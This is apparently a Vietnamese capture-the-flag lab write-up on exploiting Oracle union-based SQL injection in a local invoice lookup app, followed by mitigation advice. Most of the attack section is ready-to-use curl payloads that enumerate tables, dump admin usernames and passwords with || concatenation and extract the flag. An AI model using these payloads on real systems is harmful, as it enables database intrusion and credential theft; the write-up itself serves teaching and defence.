# SQLi-020: Oracle Union-based Single Column - Complete Writeup

## 📋 Tóm Tắt

Bài lab này yêu cầu khai thác SQL Injection trên Oracle Database sử dụng kỹ thuật **Union-based** với `||` operator để ghép nhiều giá trị khi chỉ có 1 column được hiển thị.

**Độ khó:** Medium  
**Kỹ thuật:** Oracle Union-based với || concatenation  
**Mục tiêu:** Trích xuất flag từ bảng `secrets`

---

## 🔍 Bước 1: DETECT - Tìm Điểm Chèn

### 1.1 Khám phá ứng dụng

Truy cập URL: `http://localhost:5020/`

Ứng dụng Invoice Lookup cho phép tra cứu hóa đơn theo ID:

```
http://localhost:5020/invoice?id=1
```

**Response:** Hiển thị invoice number "INV-2024-001"

### 1.2 Phát hiện SQL Injection

```bash
# Test 1: Single quote
curl "http://localhost:5020/invoice?id=1'"
# ❌ Error: ORA-01756: quoted string not properly terminated

# Test 2: Arithmetic test
curl "http://localhost:5020/invoice?id=2-1"
# ✅ Trả về INV-2024-001 (ID 1) → Arithmetic được thực thi!

# Test 3: Boolean logic
curl "http://localhost:5020/invoice?id=1 AND 1=1"
# ✅ Trả về INV-2024-001

curl "http://localhost:5020/invoice?id=1 AND 1=2"
# ❌ Không có kết quả
```

**Kết luận:** Ứng dụng có lỗ hổng SQL Injection!

---

## 🎯 Bước 2: IDENTIFY - Xác Định Database

### 2.1 Xác định DBMS từ error message

```bash
curl "http://localhost:5020/invoice?id=1'"
```

**Error Response:**
```
ORA-01756: quoted string not properly terminated
```

→ Đây là **Oracle Database** (ORA-xxxxx error codes)!

### 2.2 Xác nhận với Oracle-specific syntax

```bash
# Test FROM dual (Oracle-specific)
curl "http://localhost:5020/invoice?id=1 AND 1=(SELECT 1 FROM dual)"
# ✅ Hoạt động → Oracle confirmed
```

---

## 🔢 Bước 3: ENUMERATE - Liệt Kê Cấu Trúc

### 3.1 Xác định số columns trong query gốc

```bash
# ORDER BY technique
curl "http://localhost:5020/invoice?id=1 ORDER BY 1"
# ✅ Không lỗi

curl "http://localhost:5020/invoice?id=1 ORDER BY 2"
# ❌ Error: ORA-01785: ORDER BY item must be the number of a SELECT-list expression
```

→ Query gốc chỉ có **1 column**!

### 3.2 Xác nhận với UNION SELECT

```bash
# Oracle yêu cầu FROM dual
curl "http://localhost:5020/invoice?id=0 UNION SELECT NULL FROM dual"
# ✅ Hoạt động (trả về NULL)

curl "http://localhost:5020/invoice?id=0 UNION SELECT 'test' FROM dual"
# ✅ Hiển thị "test"
```

### 3.3 Enumerate user hiện tại

```bash
curl "http://localhost:5020/invoice?id=0 UNION SELECT user FROM dual"
# Result: APP_USER
```

### 3.4 Enumerate tables

```bash
curl "http://localhost:5020/invoice?id=0 UNION SELECT table_name FROM user_tables"
```

**Results:** (mỗi request trả về 1 row)
```
INVOICES
CUSTOMERS
ADMIN_USERS
SECRETS
```

**Để lấy tất cả tables cùng lúc, dùng LISTAGG:**

```bash
curl "http://localhost:5020/invoice?id=0 UNION SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name) FROM user_tables"
```

**Result:**
```
ADMIN_USERS,CUSTOMERS,INVOICES,SECRETS
```

### 3.5 Enumerate columns trong bảng ADMIN_USERS

```bash
curl "http://localhost:5020/invoice?id=0 UNION SELECT LISTAGG(column_name,',') WITHIN GROUP (ORDER BY column_name) FROM all_tab_columns WHERE table_name='ADMIN_USERS'"
```

**Result:**
```
ID,PASSWORD,ROLE,USERNAME
```

### 3.6 Enumerate columns trong bảng SECRETS

```bash
curl "http://localhost:5020/invoice?id=0 UNION SELECT LISTAGG(column_name,',') WITHIN GROUP (ORDER BY column_name) FROM all_tab_columns WHERE table_name='SECRETS'"
```

**Result:**
```
ID,NAME,VALUE
```

---

## 📤 Bước 4: EXTRACT - Lấy Dữ Liệu

### 4.1 Vấn đề: Chỉ có 1 column

Query gốc chỉ SELECT 1 column (invoice_number), không thể:
```sql
0 UNION SELECT username, password FROM admin_users
-- ❌ Error: query block has incorrect number of result columns
```

### 4.2 Giải pháp: || Operator (Pipe Concatenation)

Oracle dùng `||` để nối chuỗi:

```bash
# Syntax: string1 || string2 || string3
curl "http://localhost:5020/invoice?id=0 UNION SELECT username||':'||password FROM admin_users"
```

**Results:** (mỗi request 1 row, cần fetch all)

Để lấy tất cả cùng lúc:

```bash
curl "http://localhost:5020/invoice?id=0 UNION SELECT LISTAGG(username||':'||password,'<br>') WITHIN GROUP (ORDER BY username) FROM admin_users"
```

**Result:**
```
billing_user:B1ll1ng_Us3r<br>db_manager:DB_M@nager_2024<br>oracle_admin:Ora_Sup3r_S3cure!
```

### 4.3 Format đẹp hơn với nhiều fields

```bash
curl "http://localhost:5020/invoice?id=0 UNION SELECT LISTAGG(username||' | '||password||' | '||role, ' ; ') WITHIN GROUP (ORDER BY username) FROM admin_users"
```

**Result:**
```
billing_user | B1ll1ng_Us3r | user ; db_manager | DB_M@nager_2024 | admin ; oracle_admin | Ora_Sup3r_S3cure! | superadmin
```

---

## ⬆️ Bước 5: ESCALATE - Leo Thang Quyền

### 5.1 Phân tích credentials

Từ kết quả extract:
- **Super Admin:** `oracle_admin:Ora_Sup3r_S3cure!`
- **Admin:** `db_manager:DB_M@nager_2024`
- **User:** `billing_user:B1ll1ng_Us3r`

### 5.2 Kiểm tra database privileges

```bash
# Current user
curl "http://localhost:5020/invoice?id=0 UNION SELECT user FROM dual"
# Result: APP_USER

# Oracle version
curl "http://localhost:5020/invoice?id=0 UNION SELECT banner FROM v\$version WHERE ROWNUM=1"
# Result: Oracle Database 21c Express Edition...
```

---

## 🏆 Bước 6: EXFILTRATE - Trích Xuất Flag

### 6.1 Lấy flag từ bảng secrets

```bash
curl "http://localhost:5020/invoice?id=0 UNION SELECT name||':'||value FROM secrets"
```

**Result:**
```
sqli_020:FLAG{0r4cl3_p1p3_c0nc4t}
```

### 6.2 Hoặc lấy trực tiếp value

```bash
curl "http://localhost:5020/invoice?id=0 UNION SELECT value FROM secrets WHERE name='sqli_020'"
```

**Result:**
```
FLAG{0r4cl3_p1p3_c0nc4t}
```

🎉 **FLAG:** `FLAG{0r4cl3_p1p3_c0nc4t}`

---

## 📝 Summary of Exploitation Chain

```
1. DETECT      → Arithmetic test (2-1=1) works
2. IDENTIFY    → Oracle (ORA-xxxxx errors)
3. ENUMERATE   → 1 column, 4 tables (with LISTAGG)
4. EXTRACT     → username||':'||password concatenation
5. ESCALATE    → Found oracle_admin superadmin credentials
6. EXFILTRATE  → FLAG{0r4cl3_p1p3_c0nc4t}
```

**Complete Payload Sequence:**

```bash
# Step 1: Detect SQLi
curl "http://localhost:5020/invoice?id=2-1"

# Step 2: Confirm Oracle
curl "http://localhost:5020/invoice?id=1'"

# Step 3: Find column count
curl "http://localhost:5020/invoice?id=1 ORDER BY 2"

# Step 4: Enumerate tables
curl "http://localhost:5020/invoice?id=0 UNION SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name) FROM user_tables"

# Step 5: Enumerate columns
curl "http://localhost:5020/invoice?id=0 UNION SELECT LISTAGG(column_name,',') WITHIN GROUP (ORDER BY column_name) FROM all_tab_columns WHERE table_name='ADMIN_USERS'"

# Step 6: Extract users with || operator
curl "http://localhost:5020/invoice?id=0 UNION SELECT username||':'||password FROM admin_users"

# Step 7: Get flag
curl "http://localhost:5020/invoice?id=0 UNION SELECT value FROM secrets"
```

---

## 🎓 Bài Học Quan Trọng

### 1. Oracle || vs MySQL CONCAT

| DBMS   | Concatenation | Ví dụ                         |
| ------ | ------------- | ----------------------------- |
| Oracle | `\|\|`        | `username\|\|':'\\|\|password` |
| MySQL  | CONCAT()      | CONCAT(username,':',password) |
| MSSQL  | `+`           | username+':'+password         |
| PgSQL  | `\|\|`        | `username\|\|':'\\|\|password` |

### 2. FROM dual

Oracle **bắt buộc** FROM clause:
```sql
-- ❌ Lỗi trên Oracle
SELECT 'test'

-- ✅ Đúng
SELECT 'test' FROM dual
```

### 3. LISTAGG vs ROWNUM

**LISTAGG** - Aggregate tất cả rows:
```sql
SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name) FROM user_tables
-- Result: TABLE1,TABLE2,TABLE3
```

**ROWNUM** - Lấy row cụ thể:
```sql
SELECT table_name FROM user_tables WHERE ROWNUM=1
-- Result: TABLE1 (chỉ 1 row đầu tiên)
```

---

## 🛡️ Cách Phòng Chống

### 1. Sử dụng Bind Variables

```python
# ❌ Vulnerable
sql = f"SELECT invoice_number FROM invoices WHERE id = {inv_id}"

# ✅ Secure
sql = "SELECT invoice_number FROM invoices WHERE id = :id"
cursor.execute(sql, {"id": inv_id})
```

### 2. Input Validation

```python
# Validate that ID is numeric
if not inv_id.isdigit():
    return "Invalid input", 400
```

### 3. Error Message Suppression

```python
except oracledb.Error:
    return "An error occurred", 500  # Don't expose ORA-xxxxx
```

---

## 📚 References

- [Oracle Concatenation Operator](https://docs.oracle.com/en/database/oracle/oracle-database/19/sqlrf/Concatenation-Operator.html)
- [Oracle LISTAGG Function](https://docs.oracle.com/en/database/oracle/oracle-database/19/sqlrf/LISTAGG.html)
- [Oracle SQL Injection Cheat Sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet)

---

## ✅ Flag

```
FLAG{0r4cl3_p1p3_c0nc4t}
```

**Ý nghĩa flag:**
- `0r4cl3` → Oracle (leet: o=0, a=4, e=3)
- `p1p3` → pipe (leet: i=1, e=3) - ký hiệu `|`
- `c0nc4t` → concat (leet: o=0, a=4)

---

**🎯 Completed:** SQLi-020 - Oracle Union-based Single Column Exploitation
